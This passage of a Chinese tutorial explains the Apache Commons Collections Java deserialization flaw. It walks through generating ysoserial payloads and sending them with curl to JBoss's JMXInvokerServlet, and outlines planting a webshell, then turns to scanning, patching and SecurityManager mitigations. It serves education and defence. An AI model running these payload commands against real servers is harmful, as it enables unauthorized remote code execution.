          1)源码审计：寻找可以利用的“靶点”，即确定调用反序列化函数readObject的调用地点。
           2)对该应用进行网络行为抓包，寻找序列化数据，如wireshark,tcpdump等
         注： java序列化的数据一般会以标记（ac ed 00 05）开头，base64编码后的特征为rO0AB。
      (2)再考察应用的Class Path中是否包含Apache Commons Collections库
      (3)生成反序列化的payload
      (4)提交我们的payload数据
**相关工具**
ysoserial是一个用我们刚才的思路生成序列化payload数据的工具。当中针对Apache Commons Collections
3的payload也是基于`TransformedMap`和`InvokerTransformer`来构造的，然而在触发时，并没有采用上文介绍的`AnnotationInvocationHandler`，而是使用了`java.lang.reflect.Proxy`中的相关代码来实现触发。此处不再做深入分析，有兴趣的读者可以参考ysoserial的源码。
    获取方法
    去github上下载jar发行版：https://github.com/frohoff/ysoserial/releases
    wget https://github.com/frohoff/ysoserial/releases/download/v0.0.2/ysoserial-0.0.2-all.jar
    或者自行编译：
    git clone https://github.com/frohoff/ysoserial.git
    cd ysoserial
    mvn package -DskipTests
相关Tool链接
    ysoserial
    去github上下载jar发行版：https://github.com/frohoff/ysoserial/releases
    或者自行编译：
    git clone https://github.com/frohoff/ysoserial.git
    cd ysoserial
    mvn package -DskipTests 
    没有mvn的话需要先安装：sudo apt-get install maven
* * *
**实际漏洞环境测试**
    JBOSS
    JBoss是一个管理和运行EJB项目的容器和服务器
    Enterprise JavaBean (EJB)规范定义了开发和部署基于事务性、分布式对象应用程序的服务器端软件组件的体系结构。
    企业组织可以构建它们自己的组件，或从第三方供应商购买组件。
    这些服务器端组件称作 Enterprise Bean，它们是 Enterprise JavaBean 容器中驻留的分布式对象，为分布在网络中的客户机提供远程服务。
实际测试版本
    Jboss6.1
    Download: http://jbossas.jboss.org/downloads/
    Unzip: unzip jboss-as-7.1.1.Final.zip
    修改配置文件，修改默认访问端口，设置外部可访问
     vi  /server/default/deploy/jbossweb.sar/server.xml
    运行服务
    iptables -I INPUT -p tcp --dport 80 -j ACCEPT
    sh jbosspath/bin/run.sh -b 0.0.0.0        
    关闭服务器
    sh jbosspath/bin/shutdown.sh -S
    测试
    http://ip:8080
    http://ip:8080/web-console
补充：CentOS默认开启了防火墙，所以80端口是不能正常访问的)，输入命令：  
iptables -I INPUT -p tcp --dport 80 -j ACCEPT
这里以Jboss为例。Jboss利用的是HTTP协议，可以在任何端口上运行，默认安装在8080端口中。
Jboss与“JMXInvokerServlet”的[通信](http://telecom.chinabyte.com/)过程中存在一个公开漏洞。JMX是一个java的管理协议，在Jboss中的JMXInvokerServlet可以使用HTTP协议与其进行通话。这一通信功能依赖于java的序列化类。在默认安装的Jboss中，JMXInvokerServlet的路径恰好为
如果用户访问一个该url，实际上会返回一个原始的java对象，这种行为显然存在一个漏洞。但由于jmxinvokerservlet与主要的Web应用程序在同一个端口上运行，因此它很少被防火墙所拦截这个漏洞可以很经常的通过互联网被利用。
因此，可以以jmx作为Jboss接受外部输入的点，可以利用java HTTP
client包构建POST请求，post请求包中数据为使用ysoserial处理之后的构建代码
通常的测试可以使用的命令
    搜索匹配"readObject"靶点
       grep -nr "readObject" *
    测试是否含该漏洞的jar包文件
        grep -R InvokerTransformer
    生成序列化payload数据
        java -jar ysoserial-0.0.4-all.jar CommonsCollections1 '想要执行的命令' > payload.out
    提交payload数据
      curl --header 'Content-Type: application/x-java-serialized-object; class=org.jboss.invocation.MarshalledValue' --data-binary '@payload.out' http://ip:8080/invoker/JMXInvokerServlet
    exploit例子
    java -jar  ysoserial-0.0.2-all.jar   CommonsCollections1  'echo 1 > /tmp/pwned'  >  payload
    curl --header 'Content-Type: application/x-java-serialized-object; class="org".jboss.invocation.MarshalledValue' --data-binary '@/tmp/payload' http://127.0.0.1:8080/invoker/JMXInvokerServlet
我们提交payload数据时，可以抓取数据包进行分析，看起来大概像这个样子（图片不是自己环境测试中的）
* * *
**总结**
    漏洞分析
      引发：如果Java应用对用户输入，即不可信数据做了反序列化处理，那么攻击者可以通过构造恶意输入，让反序列化产生非预期的对象，非预期的对象在产生过程中就有可能带来任意代码执行。
      原因: 类ObjectInputStream在反序列化时，没有对生成的对象的输入做限制，使攻击者利用反射调用函数进行任意命令执行。
         CommonsCollections组件中对于集合的操作存在可以进行反射调用的方法
      根源：Apache Commons Collections允许链式的任意的类函数反射调用
         问题函数：org.apache.commons.collections.Transformer接口
      利用：要利用Java反序列化漏洞，需要在进行反序列化的地方传入攻击者的序列化代码。
      思路：攻击者通过允许Java序列化协议的端口，把序列化的攻击代码上传到服务器上，再由Apache Commons Collections里的TransformedMap来执行。
       至于如何使用这个漏洞对系统发起攻击，举一个简单的思路，通过本地java程序将一个带有后门漏洞的jsp（一般来说这个jsp里的代码会是文件上传和网页版的SHELL）序列化，
    将序列化后的二进制流发送给有这个漏洞的服务器，服务器会反序列化该数据的并生成一个webshell文件，然后就可以直接访问这个生成的webshell文件进行进一步利用。
**启发**
    开发者：
      为了确保序列化的安全性，可以对于一些敏感信息加密；
      确保对象的成员变量符合正确的约束条件；
      确保需要优化序列化的性能。
    漏洞挖掘：
      (1)通过代码审计/行为分析等手段发现漏洞所在靶点
      (2)进行POC分析构造时可以利用逆推法
* * *
**漏洞修补**
    Java反序列化漏洞的快速排查和修复方案
    目前打包有apache commons collections库并且应用比较广泛的主要组件有Jenkins WebLogic Jboss WebSphere  OpenNMS。
    其中Jenkins由于功能需要大都直接暴露给公网。
    首先确认产品中是否包含上述5种组件
    使用grep命令或者其他相关搜索命令检测上述组件安装目录是否包含库Apache Commons Collections。搜索下列jar。
    commons-collections.jar
    *.commons-collections.jar
    apache.commons.collections.jar
    *.commons-collections.*.jar
    如果包含请参考下述解决方案进行修复。
    通用解决方案
    更新Apache Commons Collections库
      Apache Commons Collections在 3.2.2版本开始做了一定的安全处理，新版本的修复方案对相关反射调用进行了限制，对这些不安全的Java类的序列化支持增加了开关。
    NibbleSecurity公司的ikkisoft在github上放出了一个临时补丁SerialKiller
      lib地址:https://github.com/ikkisoft/SerialKiller
      下载这个jar后放置于classpath，将应用代码中的java.io.ObjectInputStream替换为SerialKiller
      之后配置让其能够允许或禁用一些存在问题的类，SerialKiller有Hot-Reload,Whitelisting,Blacklisting几个特性，控制了外部输入反序列化后的可信类型。
严格意义说起来，Java相对来说安全性问题比较少，出现的一些问题大部分是利用反射，最终用Runtime.exec(String
cmd)函数来执行外部命令的。
如果可以禁止JVM执行外部命令，未知漏洞的危害性会大大降低，可以大大提高JVM的安全性。比如：
    SecurityManager originalSecurityManager = System.getSecurityManager();
        if (originalSecurityManager == null) {
            // 创建自己的SecurityManager
            SecurityManager sm = new SecurityManager() {
            private void check(Permission perm) {
                // 禁止exec
                if (perm instanceof java.io.FilePermission) {
                    String actions = perm.getActions();
                    if (actions != null && actions.contains("execute")) {
                        throw new SecurityException("execute denied!");
                    }
                }
                // 禁止设置新的SecurityManager
                if (perm instanceof java.lang.RuntimePermission) {
                    String name = perm.getName();
                    if (name != null && name.contains("setSecurityManager")) {
                        throw new SecurityException(
                        "System.setSecurityManager denied!");
                    }
                }
            }
            @Override
            public void checkPermission(Permission perm) {
                check(perm);
            }
            @Override
            public void checkPermission(Permission perm, Object context) {
                check(perm);
            }
        };
       System.setSecurityManager(sm);
    }
如上所示，只要在Java代码里简单加一段程序，就可以禁止执行外部程序了。
禁止JVM执行外部命令，是一个简单有效的提高JVM安全性的办法。可以考虑在代码安全扫描时，加强对Runtime.exec相关代码的检测。
**针对其他的Web Application的修复**
    Weblogic
    影响版本：Oracle WebLogic Server, 10.3.6.0, 12.1.2.0, 12.1.3.0, 12.2.1.0 版本。
    临时解决方案
    1 使用 SerialKiller 替换进行序列化操作的 ObjectInputStream 类；
    2 在不影响业务的情况下，临时删除掉项目里的
    “org/apache/commons/collections/functors/InvokerTransformer.class” 文件；
    官方解决方案
    官方声明: http://www.oracle.com/technetwork/topics/security/alert-cve-2015-4852-2763333.html
    Weblogic 用户将收到官方的修复支持
    Jboss
    临时解决方案
    1 删除 commons-collections jar 中的 InvokerTransformer, InstantiateFactory, 和InstantiateTransfromer class 文件
    官方解决方案
    https://issues.apache.org/jira/browse/COLLECTIONS-580
    https://access.redhat.com/solutions/2045023
    jenkins
    临时解决方案
      1 使用 SerialKiller 替换进行序列化操作的 ObjectInputStream 类；
      2 在不影响业务的情况下，临时删除掉项目里的“org/apache/commons/collections/functors/InvokerTransformer.class” 文件；
    官方解决方案： Jenkins 发布了 安全公告 ，并且在1.638版本中修复了这个漏洞。
    官方的补丁声明链接:
    https://jenkins-ci.org/content/mitigating-unauthenticated-remote-code-execution-0-day-jenkins-cli
    https://github.com/jenkinsci-cert/SECURITY-218
    websphere
      Version8.0，Version7.0，Version8.5 and 8.5.5 Full Profile and Liberty Profile
    临时解决方案
    1 使用 SerialKiller 替换进行序列化操作的 ObjectInputStream 类；
    2 在不影响业务的情况下，临时删除掉项目里的“org/apache/commons/collections/functors/InvokerTransformer.class” 文件
    在服务器上找org/apache/commons/collections/functors/InvokerTransformer.class类的jar，目前weblogic10以后都在Oracle/Middleware/modules下    
    com.bea.core.apache.commons.collections_3.2.0.jar，创建临时目录tt，解压之后删除InvokerTransformer.class类后
    再改成com.bea.core.apache.commons.collections_3.2.0.jar
    覆盖Oracle/Middleware/modules下，重启所有服务。如下步骤是linux详细操作方法：
    A)mkdir tt
    B)cp -r Oracle/Middleware/modules/com.bea.core.apache.commons.collections_3.2.0.jar ./tt
    C)jar xf Oracle/Middleware/modules/com.bea.core.apache.commons.collections_3.2.0.jar
    D)cd org/apache/commons/collections/functors
    E)rm -rf InvokerTransformer.class
    F)jar cf com.bea.core.apache.commons.collections_3.2.0.jar org/* META-INF/*
    G)mv com.bea.core.apache.commons.collections_3.2.0.jar Oracle/Middleware/modules/
    H)重启服务
    重启服务时候要删除server-name下的cache和tmp
    例如rm -rf ~/user_projects/domains/base_domain/servers/AdminServer/cache
    rm -rf  ~/user_projects/domains/base_domain/servers/AdminServer/tmp
* * *
## 相关CVE
CVE-2015-7501
CVE-2015-4852(Weblogic)
CVE-2015-7450(Websphere)
## **相关学习资料**
    http://www.freebuf.com/vuls/90840.html
      https://security.tencent.com/index.php/blog/msg/97
      http://www.tuicool.com/articles/ZvMbIne
      http://www.freebuf.com/vuls/86566.html
      http://sec.chinabyte.com/435/13618435.shtml
      http://www.myhack58.com/Article/html/3/62/2015/69493_2.htm
      http://blog.nsfocus.net/java-deserialization-vulnerability-comments/
      http://www.ijiandao.com/safe/cto/18152.html
      https://www.iswin.org/2015/11/13/Apache-CommonsCollections-Deserialized-Vulnerability/
      http://www.cnblogs.com/dongchi/p/4796188.html
      https://blog.chaitin.com/2015-11-11_java_unserialize_rce/?from=timeline&isappinstalled=0#h4_漏洞利用实例